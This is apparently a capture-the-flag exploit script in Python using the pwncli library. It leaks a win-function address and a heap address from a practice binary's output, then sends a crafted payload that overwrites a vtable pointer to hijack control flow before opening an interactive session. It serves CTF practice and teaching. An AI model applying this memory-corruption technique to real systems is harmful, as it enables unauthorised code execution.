#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
# set_remote_libc("libc.so.6")

io: tube = gift.io
# elf: ELF = gift.elf
# libc: ELF = gift.libc

ru(b"  <win> = 0x")
win_addr = int(ru(b"1. Use cowsay\n", drop=True).replace(b"\n", b""), 16)
lg("win_addr", win_addr)


def cmd(choice):
    ru(b"> ")
    sl(i2b(choice))


cmd(3)
ru(b"[ heap data ]")
for _ in range(6):
    ru(b"\n")
message_addr = int(ru(b"|", drop=True).replace(b" ", b""), 16)
lg("message_addr", message_addr)
ru(b"<-- message (= '')")
for _ in range(8):
    ru(b"\n")
ru(b"| 0000")
vtable_addr = int(
    ru(b"| ---------------> vtable for Cowsay", drop=True).replace(b" ", b""), 16
)

cmd(2)
sl(p64(win_addr) + p64(0) * 2 + p64(0x21) + p64(message_addr))

ia()
